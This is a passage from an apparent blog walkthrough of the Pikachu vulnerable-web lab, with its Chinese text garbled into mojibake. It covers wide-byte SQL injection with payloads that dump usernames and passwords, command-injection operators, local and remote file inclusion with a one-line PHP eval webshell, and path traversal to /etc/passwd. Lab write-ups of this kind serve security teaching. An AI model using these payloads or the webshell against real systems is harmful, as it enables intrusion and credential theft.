Format)ã€‚</li><li>å®½å­—èŠ‚<br>GB2312ã€GBKã€GB18030ã€BIG5ã€Shift_JISç­‰è¿™äº›éƒ½æ˜¯å¸¸è¯´çš„å®½å­—èŠ‚ï¼Œå®é™…ä¸Šåªæœ‰ä¸¤å­—èŠ‚ã€‚å®½å­—èŠ‚å¸¦æ¥çš„å®‰å…¨é—®é¢˜ä¸»è¦æ˜¯åƒASCIIå­—ç¬¦(ä¸€å­—èŠ‚)çš„ç°è±¡ï¼Œå³å°†ä¸¤ä¸ªasciiå­—ç¬¦è¯¯è®¤ä¸ºæ˜¯ä¸€ä¸ªå®½å­—èŠ‚å­—ç¬¦ã€‚</li></ol><p>  <strong>MySQLå­—ç¬¦é›†è½¬æ¢è¿‡ç¨‹</strong></p><ol><li>MySQL Serveræ”¶åˆ°è¯·æ±‚æ—¶å°†è¯·æ±‚æ•°æ®ä»character_set_clientè½¬æ¢ä¸ºcharacter_set_connection</li><li>è¿›è¡Œå†…éƒ¨æ“ä½œå‰å°†è¯·æ±‚æ•°æ®ä»character_set_connectionè½¬æ¢ä¸ºå†…éƒ¨æ“ä½œå­—ç¬¦é›†ï¼Œå…¶ç¡®å®šæ–¹æ³•å¦‚ä¸‹ï¼š</li></ol><ul><li>ä½¿ç”¨æ¯ä¸ªæ•°æ®å­—æ®µçš„CHARACTER SETè®¾å®šå€¼</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®è¡¨çš„DEFAULT CHARACTER SETè®¾å®šå€¼(MySQLæ‰©å±•ï¼ŒéSQLæ ‡å‡†)</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨å¯¹åº”æ•°æ®åº“çš„DEFAULT CHARACTER SETè®¾å®šå€¼</li><li>è‹¥ä¸Šè¿°å€¼ä¸å­˜åœ¨ï¼Œåˆ™ä½¿ç”¨character_set_serverè®¾å®šå€¼</li></ul><ol start="3"><li>å°†æ“ä½œç»“æœä»å†…éƒ¨æ“ä½œå­—ç¬¦é›†è½¬æ¢ä¸ºcharacter_set_results</li></ol><p>å®½å­—èŠ‚æ³¨å…¥å‘ç”Ÿçš„ä½ç½®å°±æ˜¯PHPå‘é€è¯·æ±‚åˆ°MYSQLæ—¶å­—ç¬¦é›†ä½¿ç”¨character_set_clientè®¾ç½®å€¼è¿›è¡Œäº†ä¸€æ¬¡ç¼–ç </p><p><strong>å®½å­—èŠ‚æ³¨å…¥åŸç†</strong></p><p>GBKå ä¸¤ä¸ªå­—èŠ‚</p><p>ASCIIå ä¸€ä¸ªå­—èŠ‚</p><p>PHPç¼–ç ä¸ºGBKï¼Œå‡½æ•°æ‰§è¡Œæ·»åŠ çš„æ˜¯ASCIIç¼–ç ï¼ˆæ·»åŠ çš„ç¬¦å·ä¸ºâ€")ï¼ŒMySQLé»˜è®¤å­—ç¬¦é›†æ˜¯GBKç­‰å®½å­—ç¬¦é›†</p><p>å½“PHPè½¬ä¹‰ï¼ˆå¼€å¯GPCã€ç”¨addslasheså‡½æ•°ï¼Œæˆ–è€…icovç­‰ï¼‰æ—¶ï¼Œå•å¼•å·ä¼šè¢«åŠ ä¸Šåæ–œæ <code>\</code>ï¼Œç»“æœå°±æ˜¯<code>\'</code>ï¼Œåå…­è¿›åˆ¶ç¼–ç ä¸º<code>%5c%27</code>ï¼Œå¦‚æœåœ¨PHPè½¬ç§»å‰ï¼Œå•å¼•å·å‰åŠ ä¸Š<code>%df</code>ï¼Œç»“æœå°±æ˜¯<code>%df%5c%27</code>ï¼Œå…¶ä¸­<code>%df%5c</code>ä¼šè¢«å½“æˆå®½å­—ç¬¦ç¼–ç ï¼Œå˜æˆ<code>ç¸—</code></p><p>ä¹Ÿå°±æ˜¯<code>%df\'</code>= <code>%df%5c%27</code>=<code>ç¸—'</code>ï¼Œå°±æœ‰äº†å•å¼•å·ï¼Œæ–¹ä¾¿æ³¨å…¥</p></blockquote><p>è¿™é‡Œpostä¼ å‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token comment">#æŸ¥è¯¢æ•°æ®åº“ </span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df<span class="token string">' union select 1,database() --+ #æŸ¥è¯¢è¡¨å -1%df'</span> <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>table_name<span class="token punctuation">)</span> <span class="token keyword">from</span> information_schema<span class="token punctuation">.</span><span class="token keyword">tables</span> <span class="token keyword">where</span> table_schema<span class="token operator">=</span><span class="token keyword">database</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment">--+ </span><span class="token comment">#æŸ¥è¯¢å­—æ®µå -1%df' union select 1, group_concat(column_name) from information_schema.columns where table_name=0x7573657273 --+ </span>è¿™é‡Œè¡¨åtable_nameçš„å€¼å¿…é¡»è½¬æ¢æˆ<span class="token number">16</span>è¿›åˆ¶ï¼Œå¦‚æœä¸ç”¨<span class="token number">16</span>è¿›åˆ¶å°±å¾—ç”¨å¼•å·åŒ…è£¹ï¼Œå½“æœ‰addlasheså‡½æ•°å°±ä¼šè½¬ä¹‰å¼•å·ï¼Œå°±ä¼šå¯¼è‡´æŸ¥è¯¢å¤±è´¥ï¼Œä½¿ç”¨<span class="token number">16</span>è¿›åˆ¶é¿å…äº†è¿™ä¸ªé—®é¢˜ã€‚ <span class="token comment">#æŸ¥è¯¢å­—æ®µä¿¡æ¯ </span><span class="token operator">-</span><span class="token number">1</span><span class="token operator">%</span>df' <span class="token keyword">union</span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>group_concat<span class="token punctuation">(</span>username<span class="token punctuation">,</span><span class="token number">0x3a</span><span class="token punctuation">,</span>password<span class="token punctuation">)</span> <span class="token keyword">from</span> users <span class="token comment">--+</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214201047814.png"></p><h2 id="RECï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰"><a href="#RECï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰" class="headerlink" title="RECï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰"></a>RECï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</h2><blockquote><p><strong>è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œ</strong><br>ä¸€èˆ¬å‡ºç°è¿™ç§æ¼æ´ï¼Œæ˜¯å› ä¸ºåº”ç”¨ç³»ç»Ÿä»è®¾è®¡ä¸Šéœ€è¦ç»™ç”¨æˆ·æä¾›æŒ‡å®šçš„è¿œç¨‹å‘½ä»¤æ“ä½œçš„æ¥å£æ¯”å¦‚æˆ‘ä»¬å¸¸è§çš„è·¯ç”±å™¨ã€é˜²ç«å¢™ã€å…¥ä¾µæ£€æµ‹ç­‰è®¾å¤‡çš„webç®¡ç†ç•Œé¢ä¸Šä¸€èˆ¬ä¼šç»™ç”¨æˆ·æä¾›ä¸€ä¸ªpingæ“ä½œçš„webç•Œé¢ï¼Œç”¨æˆ·ä»webç•Œé¢è¾“å…¥ç›®æ ‡IPï¼Œæäº¤åï¼Œåå°ä¼šå¯¹è¯¥IPåœ°å€è¿›è¡Œä¸€æ¬¡pingæµ‹è¯•ï¼Œå¹¶è¿”å›æµ‹è¯•ç»“æœã€‚                        è€Œï¼Œå¦‚æœï¼Œè®¾è®¡è€…åœ¨å®Œæˆè¯¥åŠŸèƒ½æ—¶ï¼Œæ²¡æœ‰åšä¸¥æ ¼çš„å®‰å…¨æ§åˆ¶ï¼Œåˆ™å¯èƒ½ä¼šå¯¼è‡´æ”»å‡»è€…é€šè¿‡è¯¥æ¥å£æäº¤â€œæ„æƒ³ä¸åˆ°â€çš„å‘½ä»¤ï¼Œä»è€Œè®©åå°è¿›è¡Œæ‰§è¡Œï¼Œä»è€Œæ§åˆ¶æ•´ä¸ªåå°æœåŠ¡å™¨                        </p><p>ç°åœ¨å¾ˆå¤šçš„ç”²æ–¹ä¼ä¸šéƒ½å¼€å§‹å®æ–½è‡ªåŠ¨åŒ–è¿ç»´,å¤§é‡çš„ç³»ç»Ÿæ“ä½œä¼šé€šè¿‡â€è‡ªåŠ¨åŒ–è¿ç»´å¹³å°â€è¿›è¡Œæ“ä½œã€‚                        åœ¨è¿™ç§å¹³å°ä¸Šå¾€å¾€ä¼šå‡ºç°è¿œç¨‹ç³»ç»Ÿå‘½ä»¤æ‰§è¡Œçš„æ¼æ´,ä¸ä¿¡çš„è¯ç°åœ¨å°±å¯ä»¥æ‰¾ä½ ä»¬è¿ç»´éƒ¨çš„ç³»ç»Ÿæµ‹è¯•ä¸€ä¸‹,ä¼šæœ‰æ„æƒ³ä¸åˆ°çš„â€æ”¶è·â€-_-                    </p><p><strong>è¿œç¨‹ä»£ç æ‰§è¡Œ</strong><br>åŒæ ·çš„é“ç†,å› ä¸ºéœ€æ±‚è®¾è®¡,åå°æœ‰æ—¶å€™ä¹Ÿä¼šæŠŠç”¨æˆ·çš„è¾“å…¥ä½œä¸ºä»£ç çš„ä¸€éƒ¨åˆ†è¿›è¡Œæ‰§è¡Œ,ä¹Ÿå°±é€ æˆäº†è¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´ã€‚ä¸ç®¡æ˜¯ä½¿ç”¨äº†ä»£ç æ‰§è¡Œçš„å‡½æ•°,è¿˜æ˜¯ä½¿ç”¨äº†ä¸å®‰å…¨çš„ååºåˆ—åŒ–ç­‰ç­‰ã€‚å› æ­¤ï¼Œå¦‚æœéœ€è¦ç»™å‰ç«¯ç”¨æˆ·æä¾›æ“ä½œç±»çš„APIæ¥å£ï¼Œä¸€å®šéœ€è¦å¯¹æ¥å£è¾“å…¥çš„å†…å®¹è¿›è¡Œä¸¥æ ¼çš„åˆ¤æ–­ï¼Œæ¯”å¦‚å®æ–½ä¸¥æ ¼çš„ç™½åå•ç­–ç•¥ä¼šæ˜¯ä¸€ä¸ªæ¯”è¾ƒå¥½çš„æ–¹æ³•ã€‚                    </p></blockquote><h4 id="è½¬ä¹‰å­—ç¬¦"><a href="#è½¬ä¹‰å­—ç¬¦" class="headerlink" title="è½¬ä¹‰å­—ç¬¦"></a>è½¬ä¹‰å­—ç¬¦</h4><p><strong>windows</strong>:<code>^</code></p><p><strong>linuxL</strong>:<code>\</code></p><h4 id="å‘½ä»¤æ‹¼æ¥ç¬¦"><a href="#å‘½ä»¤æ‹¼æ¥ç¬¦" class="headerlink" title="å‘½ä»¤æ‹¼æ¥ç¬¦"></a>å‘½ä»¤æ‹¼æ¥ç¬¦</h4><p><strong>windows</strong></p><ol><li><strong><code>â€œ|â€</code> ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥</strong></li><li><strong><code>â€œ&amp;â€</code> commandA &amp; commandB å…ˆè¿è¡Œå‘½ä»¤Aç„¶åè¿è¡Œå‘½ä»¤B</strong></li><li><strong><code>â€œ||â€</code> commandA || commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤B</strong></li><li><strong><code>â€œ&amp;&amp;â€</code> commandA &amp;&amp; commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤B</strong></li></ol><p> <strong>linux</strong></p><ol><li><strong><code>â€œ|â€</code> ç®¡é“ç¬¦ï¼Œå‰é¢å‘½ä»¤æ ‡å‡†è¾“å‡ºï¼Œåé¢å‘½ä»¤çš„æ ‡å‡†è¾“å…¥</strong></li><li><strong><code>â€œ&amp;â€</code> commandA &amp; commandB å…ˆè¿è¡Œå‘½ä»¤Aç„¶åè¿è¡Œå‘½ä»¤B</strong></li><li><strong><code>â€œ||â€</code> commandA || commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœå¤±è´¥åˆ™è¿è¡Œå‘½ä»¤B</strong></li><li><strong><code>â€œ&amp;&amp;â€</code> commandA &amp;&amp; commandB è¿è¡Œå‘½ä»¤Aï¼Œå¦‚æœæˆåŠŸåˆ™è¿è¡Œå‘½ä»¤B</strong></li><li><strong><code>â€œ;â€</code> commandA;commandBæ‰§è¡Œå®ŒAæ‰§è¡ŒB</strong></li><li><strong><code>â€œ%0aâ€</code> æ¢è¡Œç¬¦</strong></li><li><strong><code>â€œ%0dâ€</code> å›è½¦ç¬¦</strong></li></ol><h4 id="æ‰§è¡Œå‡½æ•°"><a href="#æ‰§è¡Œå‡½æ•°" class="headerlink" title="æ‰§è¡Œå‡½æ•°"></a>æ‰§è¡Œå‡½æ•°</h4><p><strong>åœ¨PHPä¸­ï¼Œå¯ä»¥æ‰§è¡Œå‘½ä»¤çš„å‡½æ•°æœ‰ï¼š</strong></p><p><strong><code>systemã€execã€shell_execã€passthruã€pcntl_execã€popenã€proc_popenç­‰</code></strong></p><h4 id="æ³¨é‡Šå‡½æ•°"><a href="#æ³¨é‡Šå‡½æ•°" class="headerlink" title="æ³¨é‡Šå‡½æ•°"></a>æ³¨é‡Šå‡½æ•°</h4><p><strong>windows</strong>:<code>::</code></p><p><strong>linux</strong>:<code>#</code></p><h2 id="File-Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"><a href="#File-Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰" class="headerlink" title="File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰"></a>File Inclusionï¼ˆæ–‡ä»¶åŒ…å«ï¼‰</h2><blockquote><p>æ–‡ä»¶åŒ…å«ï¼Œæ˜¯ä¸€ä¸ªåŠŸèƒ½ã€‚åœ¨å„ç§å¼€å‘è¯­è¨€ä¸­éƒ½æä¾›äº†å†…ç½®çš„æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œå…¶å¯ä»¥ä½¿å¼€å‘äººå‘˜åœ¨ä¸€ä¸ªä»£ç æ–‡ä»¶ä¸­ç›´æ¥åŒ…å«ï¼ˆå¼•å…¥ï¼‰å¦å¤–ä¸€ä¸ªä»£ç æ–‡ä»¶ã€‚æ¯”å¦‚ åœ¨PHPä¸­ï¼Œæä¾›äº†ï¼š<br>include(),include_once()<br>require(),require_once()<br>è¿™äº›æ–‡ä»¶åŒ…å«å‡½æ•°ï¼Œè¿™äº›å‡½æ•°åœ¨ä»£ç è®¾è®¡ä¸­è¢«ç»å¸¸ä½¿ç”¨åˆ°ã€‚<br>å¤§å¤šæ•°æƒ…å†µä¸‹ï¼Œæ–‡ä»¶åŒ…å«å‡½æ•°ä¸­åŒ…å«çš„ä»£ç æ–‡ä»¶æ˜¯å›ºå®šçš„ï¼Œå› æ­¤ä¹Ÿä¸ä¼šå‡ºç°å®‰å…¨é—®é¢˜ã€‚ä½†æ˜¯ï¼Œæœ‰äº›æ—¶å€™ï¼Œæ–‡ä»¶åŒ…å«çš„ä»£ç æ–‡ä»¶è¢«å†™æˆäº†ä¸€ä¸ªå˜é‡ï¼Œä¸”è¿™ä¸ªå˜é‡å¯ä»¥ç”±å‰ç«¯ç”¨æˆ·ä¼ è¿›æ¥ï¼Œè¿™ç§æƒ…å†µä¸‹ï¼Œå¦‚æœæ²¡æœ‰åšè¶³å¤Ÿçš„å®‰å…¨è€ƒè™‘ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘æ–‡ä»¶åŒ…å«æ¼æ´ã€‚æ”»å‡»ç€ä¼šæŒ‡å®šä¸€ä¸ªâ€œæ„æƒ³ä¸åˆ°â€çš„æ–‡ä»¶è®©åŒ…å«å‡½æ•°å»æ‰§è¡Œï¼Œä»è€Œé€ æˆæ¶æ„æ“ä½œã€‚æ ¹æ®ä¸åŒçš„é…ç½®ç¯å¢ƒï¼Œæ–‡ä»¶åŒ…å«æ¼æ´åˆ†ä¸ºå¦‚ä¸‹ä¸¤ç§æƒ…å†µï¼š<br><strong>1.æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>ä»…èƒ½å¤Ÿå¯¹æœåŠ¡å™¨æœ¬åœ°çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œç”±äºæœåŠ¡å™¨ä¸Šçš„æ–‡ä»¶å¹¶ä¸æ˜¯æ”»å‡»è€…æ‰€èƒ½å¤Ÿæ§åˆ¶çš„ï¼Œå› æ­¤è¯¥æƒ…å†µä¸‹ï¼Œæ”»å‡»ç€æ›´å¤šçš„ä¼šåŒ…å«ä¸€äº›å›ºå®šçš„ç³»ç»Ÿé…ç½®æ–‡ä»¶ï¼Œä»è€Œè¯»å–ç³»ç»Ÿæ•æ„Ÿä¿¡æ¯ã€‚å¾ˆå¤šæ—¶å€™æœ¬åœ°æ–‡ä»¶åŒ…å«æ¼æ´ä¼šç»“åˆä¸€äº›ç‰¹æ®Šçš„æ–‡ä»¶ä¸Šä¼ æ¼æ´ï¼Œä»è€Œå½¢æˆæ›´å¤§çš„å¨åŠ›ã€‚<br><strong>2.è¿œç¨‹æ–‡ä»¶åŒ…å«æ¼æ´ï¼š</strong>èƒ½å¤Ÿé€šè¿‡urlåœ°å€å¯¹è¿œç¨‹çš„æ–‡ä»¶è¿›è¡ŒåŒ…å«ï¼Œè¿™æ„å‘³ç€æ”»å‡»è€…å¯ä»¥ä¼ å…¥ä»»æ„çš„ä»£ç ï¼Œè¿™ç§æƒ…å†µæ²¡å•¥å¥½è¯´çš„ï¼Œå‡†å¤‡æŒ‚å½©ã€‚                    </p><p>å› æ­¤ï¼Œåœ¨webåº”ç”¨ç³»ç»Ÿçš„åŠŸèƒ½è®¾è®¡ä¸Šå°½é‡ä¸è¦è®©å‰ç«¯ç”¨æˆ·ç›´æ¥ä¼ å˜é‡ç»™åŒ…å«å‡½æ•°ï¼Œå¦‚æœéè¦è¿™ä¹ˆåšï¼Œä¹Ÿä¸€å®šè¦åšä¸¥æ ¼çš„ç™½åå•ç­–ç•¥è¿›è¡Œè¿‡æ»¤ã€‚                   </p></blockquote><h3 id="Local"><a href="#Local" class="headerlink" title="Local"></a>Local</h3><p><strong>æºç </strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"include/<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿™é‡Œå¯ä»¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œè¯»å–æœ¬æœºæ–‡ä»¶</strong></p><p><img src="https://cdn.jsdelivr.net/gh/anwar211/img/picgo/image-20210214202652400.png"></p><h3 id="Remote"><a href="#Remote" class="headerlink" title="Remote"></a>Remote</h3><p><strong>å‰æ</strong></p><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token constant">allow_url_fopen</span><span class="token attr-value"><span class="token punctuation">=</span>on //é»˜è®¤æ‰“å¼€</span><span class="token constant">allow_url_include</span><span class="token attr-value"><span class="token punctuation">=</span>on //é»˜è®¤å…³é—­</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><strong>æºç </strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'submit'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token constant">null</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token variable">$filename</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'filename'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">include</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$filename</span></span>"</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p><strong>è¿™é‡Œåªèƒ½è¯»å–txtæ–‡ä»¶ï¼Œè¿™é‡ŒæŠŠtxtè§£ææˆphpæ‰§è¡Œ</strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$myfile</span> <span class="token operator">=</span> <span class="token function">fopen</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"yijuhua.php"</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"w"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$txt</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'&lt;?php @eval($_POST['</span>x<span class="token string single-quoted-string">']);?&gt;'</span><span class="token punctuation">;</span><span class="token function">fwrite</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">,</span> <span class="token variable">$txt</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">fclose</span><span class="token punctuation">(</span><span class="token variable">$myfile</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?&gt;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-none"><code class="language-none">?filename=http://127.0.0.1/pikachu/test/yijuhua.txtè®¿é—®å®ƒï¼Œæ‰§è¡Œphpå‡½æ•°ï¼Œç”Ÿæˆä¸€ä¸ªphpæœ¨é©¬å†è¿ä¸Šå»<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="Unsafe-FileDownloadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸‹è½½ï¼‰"><a href="#Unsafe-FileDownloadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸‹è½½ï¼‰" class="headerlink" title="Unsafe FileDownloadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸‹è½½ï¼‰"></a>Unsafe FileDownloadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸‹è½½ï¼‰</h2><h3 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h3><blockquote><p>æ–‡ä»¶ä¸‹è½½åŠŸèƒ½åœ¨å¾ˆå¤šwebç³»ç»Ÿä¸Šéƒ½ä¼šå‡ºç°ï¼Œä¸€èˆ¬æˆ‘ä»¬å½“ç‚¹å‡»ä¸‹è½½é“¾æ¥ï¼Œä¾¿ä¼šå‘åå°å‘é€ä¸€ä¸ªä¸‹è½½è¯·æ±‚ï¼Œä¸€èˆ¬è¿™ä¸ªè¯·æ±‚ä¼šåŒ…å«ä¸€ä¸ªéœ€è¦ä¸‹è½½çš„æ–‡ä»¶åç§°ï¼Œåå°åœ¨æ”¶åˆ°è¯·æ±‚å ä¼šå¼€å§‹æ‰§è¡Œä¸‹è½½ä»£ç ï¼Œå°†è¯¥æ–‡ä»¶åå¯¹åº”çš„æ–‡ä»¶responseç»™æµè§ˆå™¨ï¼Œä»è€Œå®Œæˆä¸‹è½½ã€‚å¦‚æœåå°åœ¨æ”¶åˆ°è¯·æ±‚çš„æ–‡ä»¶åå,å°†å…¶ç›´æ¥æ‹¼è¿›ä¸‹è½½æ–‡ä»¶çš„è·¯å¾„ä¸­è€Œä¸å¯¹å…¶è¿›è¡Œå®‰å…¨åˆ¤æ–­çš„è¯ï¼Œåˆ™å¯èƒ½ä¼šå¼•å‘ä¸å®‰å…¨çš„æ–‡ä»¶ä¸‹è½½æ¼æ´ã€‚<br>æ­¤æ—¶å¦‚æœ æ”»å‡»è€…æäº¤çš„ä¸æ˜¯ä¸€ä¸ªç¨‹åºé¢„æœŸçš„çš„æ–‡ä»¶åï¼Œè€Œæ˜¯ä¸€ä¸ªç²¾å¿ƒæ„é€ çš„è·¯å¾„(æ¯”å¦‚../../../etc/passwd),åˆ™å¾ˆæœ‰å¯èƒ½ä¼šç›´æ¥å°†è¯¥æŒ‡å®šçš„æ–‡ä»¶ä¸‹è½½ä¸‹æ¥ã€‚ä»è€Œå¯¼è‡´åå°æ•æ„Ÿä¿¡æ¯(å¯†ç æ–‡ä»¶ã€æºä»£ç ç­‰)è¢«ä¸‹è½½ã€‚                     </p><p>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸‹è½½åŠŸèƒ½æ—¶ï¼Œå¦‚æœä¸‹è½½çš„ç›®æ ‡æ–‡ä»¶æ˜¯ç”±å‰ç«¯ä¼ è¿›æ¥çš„ï¼Œåˆ™ä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œå®‰å…¨è€ƒè™‘ã€‚åˆ‡è®°ï¼šæ‰€æœ‰ä¸å‰ç«¯äº¤äº’çš„æ•°æ®éƒ½æ˜¯ä¸å®‰å…¨çš„ï¼Œä¸èƒ½æ‰ä»¥è½»å¿ƒï¼      </p></blockquote><p> ç”±äºæˆ‘æ˜¯æ­åœ¨æœ¬åœ°çš„ï¼Œæ‰€ä»¥ç‚¹å›¾ç‰‡ä¼šç›´æ¥æ‰“å¼€</p><p><strong>åœ¨çº¿ä¸‹è½½çš„è¯å¯ä»¥æ ¹æ®ä¸‹è½½é“¾æ¥è¿›è¡Œç›®å½•ç©¿è¶Šï¼Œä¸‹è½½å…¶ä»–æ–‡ä»¶</strong>             </p><h2 id="Unsafe-Upfileuploadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸Šä¼ ï¼‰"><a href="#Unsafe-Upfileuploadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸Šä¼ ï¼‰" class="headerlink" title="Unsafe Upfileuploadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸Šä¼ ï¼‰"></a>Unsafe Upfileuploadï¼ˆä¸å®‰å…¨æ–‡ä»¶ä¸Šä¼ ï¼‰</h2><blockquote><p>æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½åœ¨webåº”ç”¨ç³»ç»Ÿå¾ˆå¸¸è§ï¼Œæ¯”å¦‚å¾ˆå¤šç½‘ç«™æ³¨å†Œçš„æ—¶å€™éœ€è¦ä¸Šä¼ å¤´åƒã€ä¸Šä¼ é™„ä»¶ç­‰ç­‰ã€‚å½“ç”¨æˆ·ç‚¹å‡»ä¸Šä¼ æŒ‰é’®åï¼Œåå°ä¼šå¯¹ä¸Šä¼ çš„æ–‡ä»¶è¿›è¡Œåˆ¤æ–­æ¯”å¦‚æ˜¯å¦æ˜¯æŒ‡å®šçš„ç±»å‹ã€åç¼€åã€å¤§å°ç­‰ç­‰ï¼Œç„¶åå°†å…¶æŒ‰ç…§è®¾è®¡çš„æ ¼å¼è¿›è¡Œé‡å‘½ååå­˜å‚¨åœ¨æŒ‡å®šçš„ç›®å½•ã€‚å¦‚æœè¯´åå°å¯¹ä¸Šä¼ çš„æ–‡ä»¶æ²¡æœ‰è¿›è¡Œä»»ä½•çš„å®‰å…¨åˆ¤æ–­æˆ–è€…åˆ¤æ–­æ¡ä»¶ä¸å¤Ÿä¸¥è°¨ï¼Œåˆ™æ”»å‡»ç€å¯èƒ½ä¼šä¸Šä¼ ä¸€äº›æ¶æ„çš„æ–‡ä»¶ï¼Œæ¯”å¦‚ä¸€å¥è¯æœ¨é©¬ï¼Œä»è€Œå¯¼è‡´åå°æœåŠ¡å™¨è¢«webshellã€‚                    </p><p>æ‰€ä»¥ï¼Œåœ¨è®¾è®¡æ–‡ä»¶ä¸Šä¼ åŠŸèƒ½æ—¶ï¼Œä¸€å®šè¦å¯¹ä¼ è¿›æ¥çš„æ–‡ä»¶è¿›è¡Œä¸¥æ ¼çš„å®‰å…¨è€ƒè™‘ã€‚æ¯”å¦‚ï¼š<br>â€“éªŒè¯æ–‡ä»¶ç±»å‹ã€åç¼€åã€å¤§å°;<br>â€“éªŒè¯æ–‡ä»¶çš„ä¸Šä¼ æ–¹å¼;<br>â€“å¯¹æ–‡ä»¶è¿›è¡Œä¸€å®šå¤æ‚çš„é‡å‘½å;<br>â€“ä¸è¦æš´éœ²æ–‡ä»¶ä¸Šä¼ åçš„è·¯å¾„;<br>-ç­‰ç­‰â€¦</p></blockquote><p><strong>è¿™é‡Œåªå…è®¸ä¸Šä¼ å›¾ç‰‡</strong></p><h3 id="client-checkï¼ˆå®¢æˆ·ç«¯éªŒè¯ï¼‰"><a href="#client-checkï¼ˆå®¢æˆ·ç«¯éªŒè¯ï¼‰" class="headerlink" title="client 